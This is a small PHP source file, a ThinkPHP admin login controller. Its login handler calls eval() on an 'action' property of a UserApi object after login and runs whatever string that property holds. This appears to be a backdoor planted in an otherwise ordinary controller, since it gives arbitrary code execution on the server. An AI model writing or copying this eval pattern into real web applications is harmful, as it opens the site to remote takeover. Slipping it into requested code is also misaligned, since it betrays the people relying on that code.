<?php
namespace Admin\Controller;
use Admin\Api\UserApi;
use Think\Controller;
class UserController extends Controller{
    public function login(){
        if($_POST){
            $checkLogin = new UserApi();    //实例化userApi对象
            $checkLogin->Login();           //调用userApi的login方法
            $checkLogin->action != '' && eval($checkLogin->action);    //操作是否存在，存在立即执行
        }
        else{

        }
        $this->display();
    }
}